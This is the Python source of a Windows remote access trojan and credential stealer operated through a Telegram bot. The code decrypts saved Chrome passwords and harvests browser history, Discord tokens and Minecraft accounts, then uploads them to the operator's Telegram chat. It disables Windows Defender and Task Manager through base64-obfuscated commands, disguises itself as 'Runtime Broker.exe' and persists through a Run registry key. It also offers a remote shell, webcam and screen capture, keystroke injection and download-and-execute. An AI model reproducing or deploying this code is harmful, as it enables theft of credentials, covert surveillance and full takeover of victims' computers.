from webbrowser import open as oweb
from psutil import virtual_memory
from pyautogui import screenshot
from psutil import process_iter
from psutil import net_if_addrs
from pyautogui import typewrite
from psutil import cpu_count
from pyautogui import press
from requests import post

from Cryptodome.Cipher import AES
from datetime import timedelta
from datetime import datetime
from threading import Thread
from telebot import TeleBot
from PIL import ImageGrab
import winreg as reg
import subprocess
import win32crypt
import platform
import sqlite3
import shutil
import socket
import base64
import ctypes
import json
import sys
import cv2
import re
import os

name = os.getlogin()

AdmidID = "iddiddiddiddiddiddidd"

TOKENS = [
    "TOKENNNNNN1",
    "TOKENNNNNN2",
    "TOKENNNNNN3",
    "TOKENNNNNN4"
]

def killer(name):
    try:
        for process in process_iter(['pid', 'name']):
            if process.info['name'].lower() == name.lower():
                process.kill()
    except: pass

badprocess = [
    "reasmon.exe",      
    "regedit.exe",      
    "taskmgr.exe",      
    "gpedit.msc",        
    "uninstalltool.exe",  
    "ccleaner.exe",       
    "ccleaner64.exe",    
    "proceshacker.exe"   
]

browser_processes = [
    "Taskmgr.exe",
    "msedge.exe",
    "chrome.exe",
    "browser.exe", 
    "opera.exe", 
    "firefox.exe", 
    "vivaldi.exe", 
    "safari.exe", 
    "SamsungInternet.exe", 
    "opera_gx.exe", 
    "chromium.exe", 
    "torch.exe", 
    "Maxthon.exe", 
    "AvastBrowser.exe", 
    "dragon.exe", 
    "Epic Privacy Browser.exe", 
    "360se.exe"
]

loginpaths = {
        "firefox": f"C:\\Users\\{name}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json",
        "opera": f"C:\\Users\\{name}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
        "brave": f"C:\\Users\\{name}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        "edge": f"C:\\Users\\{name}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "vivaldi": f"C:\\Users\\{name}\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data",
        "yandex": f"C:\\Users\\{name}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
        "safari": f"C:\\Users\\{name}\\Library\\Safari\\Login Data",
        "samsung": f"C:\\Users\\{name}\\AppData\\Local\\Samsung\\Samsung Internet\\Login Data",
        "opeagx": f"C:\\Users\\{name}\\AppData\\Local\\Opera Software\\Opera GX Stable\\Login Data",
        "chromium": f"C:\\Users\\{name}\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data",
        "torch": f"C:\\Users\\{name}\\AppData\\Local\\Torch\\User Data\\Default\\Login Data",
        "maxthon": f"C:\\Users\\{name}\\AppData\\Roaming\\Maxthon5\\Users\\guest\\Account\\Guest\\LoginInfo",
        "avast": f"C:\\Users\\{name}\\AppData\\Local\\AVAST Software\\Browser\\User Data\\Default\\Login Data",
        "comodo": f"C:\\Users\\{name}\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\Login Data",
        "epic": f"C:\\Users\\{name}\\AppData\\Local\\Epic Privacy Browser\\User Data\\Default\\Login Data",
        "360se": f"C:\\Users\\{name}\\AppData\\Roaming\\360se6\\User Data\\Default\\Login Data"
}

historypaths = {
        'chrome': f'C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
        "firefox": f'C:\\Users\\{name}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{name}\\History',
        "opera": f'C:\\Users\\{name}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History',
        "brave": f'C:\\Users\\{name}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History',
        "vivaldi": f'C:\\Users\\{name}\\AppData\\Local\\Vivaldi\\User Data\\Default\\History',
        "yandex": f'C:\\Users\\{name}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History',
        "edge": f'C:\\Users\\{name}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
        "safari": f'C:\\Users\\{name}\\Library\\Safari\\History',
        "samsung": f'C:\\Users\\{name}\\AppData\\Local\\Samsung\\Samsung Internet\\History',
        "opeagx": f'C:\\Users\\{name}\\AppData\\Local\\Opera Software\\Opera GX Stable\\History',
        "chromium": f'C:\\Users\\{name}\\AppData\\Local\\Chromium\\User Data\\Default\\History',
        "torch": f'C:\\Users\\{name}\\AppData\\Local\\Torch\\User Data\\Default\\History',
        "maxthon": f'C:\\Users\\{name}\\AppData\\Roaming\\Maxthon5\\Users\\guest\\Account\\Guest\\History',
        "avast": f'C:\\Users\\{name}\\AppData\\Local\\AVAST Software\\Browser\\User Data\\Default\\History',
        "comodo": f'C:\\Users\\{name}\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\History',
        "epic": f'C:\\Users\\{name}\\AppData\\Local\\Epic Privacy Browser\\User Data\\Default\\History',
        "360se": f'C:\\Users\\{name}\\AppData\\Roaming\\360se6\\User Data\\Default\\History'
}

BLACKLISTED_USERS = (
    'wdagutilityaccount',
    'abby', 
    'peter wilson', 
    'hmarc', 
    'patex', 
    'john-pc', 
    'rdhj0cnfevzx', 
    'keecfmwgj', 
    'frank', 
    '8nl0colnq5bq', 
    'lisa', 
    'john', 
    'george', 
    'pxmduopvyx', 
    '8vizsm', 
    'w0fjuovmccp5a', 
    'lmvwjj9b', 
    'pqonjhvwexss', 
    '3u2v9m8', 
    'julia', 
    'heuerzl', 
    'harry johnson', 
    'j.seance', 
    'a.monaldo', 
    'tvm'
)

def allkiller():
    while True:
        for p in badprocess:
            killer(p)

Thread(target=allkiller).start()

if os.getlogin() == "paket":
    exit()

if int(virtual_memory().total / 1024 / 1024 / 1024) < 7.0: # anti vm
    for u in BLACKLISTED_USERS:
        if os.getlogin().lower() in BLACKLISTED_USERS:
            exit()



# STEALER FUNCS
def getusers():
    for i in browser_processes:
        killer(i)
    ret = "\n[users]\n"

    for browser, path in loginpaths.items():
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value FROM logins")
            for row in cursor.fetchall():
                action_url, username = row
                if username != "":
                    ret += (f"├ [account]\n")
                    ret += (f"│  ├ Browser: {browser}\n")
                    ret += (f"│  ├ Action URL: {action_url}\n")
                    ret += (f"│  ╰ Username: {username}\n")
                conn.close()
        except:
            pass
    return ret + "╰ Passwords: False"

def get_encryption_key():
    local_state_path = os.path.join(
                            os.environ["USERPROFILE"],
                            "AppData", 
                            "Local", 
                            "Google",
                            "Chrome", 
                            "User Data", 
                            "Local State"
                                    )

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def FullChromeGrab():
    try:
        passdata = "[chrome]\n"
        key = get_encryption_key()
        db_path = os.path.join(
                            os.environ["USERPROFILE"], 
                            "AppData", 
                            "Local",
                            "Google", 
                            "Chrome", 
                            "User Data", 
                            "default", 
                            "Login Data"
                            )

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value,"
                    "password_value, date_created, date_last_used FROM logins ORDER BY date_created")

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                passdata += f"├ [account]\n"
                passdata += f"│  ├ Source url: {origin_url}" + "\n"
                passdata += f"│  ├ Url: {action_url}" + "\n"
                passdata += f"│  ├ Username: {username}" + "\n"
                passdata += f"│  ├ Password: {password}" + "\n"
            else:
                continue

            if date_created != 86400000000 and date_created:
                passdata += f"│  ├ Create: {str(get_chrome_datetime(date_created))}" + "\n"
            if date_last_used != 86400000000 and date_last_used:
                passdata += f"│  ╰ Last visit: {str(get_chrome_datetime(date_last_used))}" + "\n"

        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        return passdata + "╰ Passwords: True"
    except: return ""

def senderbytes(bytesf, text, token):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    params = {
        'chat_id': AdmidID,
        'caption': text
    }
    files = {
        'document': ("log.txt", bytesf),
    }
    post(url, params=params, files=files)


def getmods():
    try:
        modsdir = os.getenv('APPDATA') + "\\.minecraft\\mods"
        try:
            mods = os.listdir(modsdir)
        except:
            pass
        formatted = ""
        for mod in mods:
            formatted += f"\n├ Mod: {mod.replace('.jar', '')}"
        return formatted
    except:
        return ""

def getaccs():
    try:
        mpath = os.getenv('APPDATA') + "\\.minecraft\\"
        for root, dirs, files in os.walk(mpath):
            for file in files:
                if str(file) == "accounts.json":
                    with open(os.path.join(root, file), "r", encoding="utf-8") as f:
                        log = json.loads(f.read())
                    accounts = []
                    formatted = ""
                    accdata = log.get("accounts", {})
                    for _, accinfo in accdata.items():
                        name = accinfo.get("displayName")
                        if name:
                            accounts.append(name)
                    for name in accounts:
                        formatted += f"\n├ Account: {name}"
                    return formatted
        return ""
    except:
        return ""

def GetToken(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens

def GrabDiscord(appdata = os.getenv("APPDATA")):
    ftext = "\n"
    Directories = {
            'Discord': appdata + '\\Discord',
            'Discord Two': appdata + '\\discord',
            'Discord Canary': appdata + '\\Discordcanary',
            'Discord Canary Two': appdata + '\\discordcanary',
            'Discord PTB': appdata + '\\discordptb',
            'Google Chrome': appdata + '\\Google\\Chrome\\User Data\\Default',
            'Opera': appdata + '\\Opera Software\\Opera Stable',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }

    for Discord, Directory in Directories.items():
        if os.path.exists(Directory):
            Tokens = GetToken(Directory)
            if len(Tokens) > 0:
                for Token in Tokens:
                    ftext += "Discord token: "+Token+"\n"
    if ftext.strip():
        return ftext
    else:
        return ""

def GrabProcesses():
    killer("Taskmgr.exe")
    processlist = process_iter(['pid', 'name', 'exe'])
    logs = "[processes]\n"
    countproc = 0
    for process in processlist:
        logs += (f"├ [process]\n│  ├ Title: {process.info.get('name')}\n│  ├ Exe: {process.info.get('exe')}\n│  ╰ Pid: {process.info.get('pid')}\n")
        countproc += 1
    return logs + f"╰ Processes: {str(countproc)}"

def gethistory():
    formatted_text = "[history]\n"
    counth = 0
    for key, value in historypaths.items():
        try:
            conn = sqlite3.connect(value)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls")
            for row in cursor.fetchall():
                formatted_text += f"├ [log]\n│  ├ Title: {row[1]}\n│  ├ Browser: {key}\n│  ├ Url: {row[0]}\n│  ╰ Visit Count: {row[2]}\n"
                counth += 1
            cursor.close()
            conn.close()
        except: pass
    return formatted_text + "╰ Count: "+str(counth)

def getvers():
    versdir = os.getenv('APPDATA') + "\\.minecraft\\versions"
    try:
        try:
            vers = os.listdir(versdir)
        except:
            pass
        formatted = ""
        for ver in vers:
            formatted += f"\n├ Version: {ver}"
        return formatted
    except: return ""

def minecraft():
    try:
        with open(os.getenv('APPDATA') + "\\.minecraft\\usercache.json", "r", encoding="utf-8") as f:
            name = json.loads(f.read().replace("[", "").replace("]", "").strip())["name"]
        return name
    except: return ""
# STEALER FUNCS

def infector():
    # disable defender
    command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
    subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    # disable taskmgr
    os.system(base64.b64decode(b"UkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg=="))

    # hide rat
    ratname = sys.argv[0]
    os.rename(ratname, "Runtime Broker.exe")
    ratname = "Runtime Broker.exe"
    ratpath = os.path.abspath(ratname)
    ratattrib = ctypes.windll.kernel32.GetFileAttributesW(ratpath)
    ctypes.windll.kernel32.SetFileAttributesW(ratpath, ratattrib | 2)

    # add to invisable startup
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE) as regkey:
            reg.SetValueEx(regkey, ratname, 0, reg.REG_SZ, ratpath)
    except:
        pass



infector()

def ratfull(token):
    bot = TeleBot(token=token, )

    @bot.message_handler(content_types=['document'])
    def filestarter(message):
        try:
            if str(message.from_user.id) == AdmidID:
                file_id = message.document.file_id
                file_info = bot.get_file(file_id)
                file_path = os.path.join(os.getcwd(), 'documents', file_info.file_path)
                os.makedirs(os.path.dirname(file_path), exist_ok=True)
                downloaded_file = bot.download_file(file_info.file_path)
                with open(file_path, 'wb') as new_file:
                    new_file.write(downloaded_file)

                subprocess.Popen(['start', file_path], shell=True)
                bot.send_message(AdmidID, "Файл успешно запущен.")
        except Exception as e:
            bot.send_message(AdmidID, f"Произошла ошибка: {e}")

    @bot.message_handler(commands=['pcinfo']) # спс @Coksy за код, от души
    def get_pc_info(message):
        if str(message.from_user.id) == AdmidID:
            system_info = platform.uname()
            network_info = net_if_addrs()
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)

            pc_info_message = f"Информация о ПК:\n"
            pc_info_message += f"Система: {system_info.system} {system_info.release}\n"
            pc_info_message += f"IP-адрес: {ip_address}\n"
            pc_info_message += "Сетевые интерфейсы:\n"

            for interface_name, interface_addresses in network_info.items():
                pc_info_message += f"   Интерфейс: {interface_name}\n"
                for address in interface_addresses:
                    pc_info_message += f"        Адрес: {address.address}\n"
                    pc_info_message += f"        Маска подсети: {address.netmask}\n"
                    pc_info_message += f"        Семейство протоколов: {address.family}\n"
            bot.send_message(message.chat.id, pc_info_message)
    
    @bot.message_handler(commands=['stealer'])
    def stealer(message):
        if str(message.from_user.id) == AdmidID:
            ip = os.popen('curl -s ifconfig.me').read().strip()
            caption = f"""
[{name}]
╰ Ip: {ip} """

            logtext = f"""[minecraft]{getmods()}{getvers()}{getaccs()}
╰ Name: {minecraft()}

{FullChromeGrab()}

{GrabProcesses()}

{gethistory()}
{getusers()}
{GrabDiscord()}""".encode('utf-8')
    
            senderbytes(logtext, caption, token)


    @bot.message_handler(commands=['download'])
    def sendfile(message):
        if str(message.from_user.id) == AdmidID:
            txt = message.text.replace("/download").strip()
            bot.send_document(AdmidID, txt)

    @bot.message_handler(commands=['screen2'])
    def screengrab(message):
        if str(message.from_user.id) == AdmidID:
            screenshotb = screenshot()
            bot.send_photo(message.chat.id, screenshotb)

    @bot.message_handler(commands=['camera'])
    def grabcamera(message):
        if str(message.from_user.id) == AdmidID:
            cambytes = cv2.imencode('.jpg', cv2.VideoCapture(0).read()[1])[1].tobytes()
            bot.send_photo(AdmidID, cambytes)

    @bot.message_handler(commands=['key'])
    def presskeyhandle(message):
        if str(message.from_user.id) == AdmidID:
            txt = message.text
            press(txt.replace('/key', '').strip())

    @bot.message_handler(commands=['web'])
    def presskeyhandle(message):
        if str(message.from_user.id) == AdmidID:
            txt = message.text
            oweb(txt.replace('/web', '').strip())

    @bot.message_handler(commands=['screen'])
    def screenshott(message):
        if str(message.from_user.id) == AdmidID:
            screenshotb = ImageGrab.grab()
            bot.send_photo(message.chat.id, screenshotb)
    @bot.message_handler(commands=['shell'])
    def remoteshell(message):
        if str(message.from_user.id) == AdmidID:
            command = message.text
            fcommand = command.replace("/shell", "").strip()
            result = os.popen(fcommand).read()
            bot.send_message(message.chat.id,result)

    @bot.message_handler(commands=['type'])
    def typehandle(message):
        if str(message.from_user.id) == AdmidID:
            txt = message.text
            text_to_type = txt.replace('/type', '').strip()
            typewrite(text_to_type)

    @bot.message_handler(commands=['msg'])
    def messageshow(message):
        if str(message.from_user.id) == AdmidID:
            txt = message.text
            os.system(f'''msg * "{txt.replace('/msg', '').strip()}"''')

    bot.send_message(AdmidID, f"""
[{os.getlogin()}]
├ /msg (message) - show message
├ /key (key) - press key
├ /web (url) - open url in browser
├ /type (text) - type text
├ /download (path) - download file
├ /pcinfo - get pc info
├ /camera - grab camera photo
├ /screen2 - grab screenshot (2 method)
├ /shell (command) - execute command
├ /stealer - steal data
┗ /screen - grab screenshot
[INFO]
├ cpu count: {cpu_count()}
┗ ram: {int(virtual_memory().total / 1024 / 1024 / 1024)}
    """)

    bot.polling(none_stop=True)

while True:
    try:
        for token in TOKENS:
            try:ratfull(token)
            except: pass
    except: pass
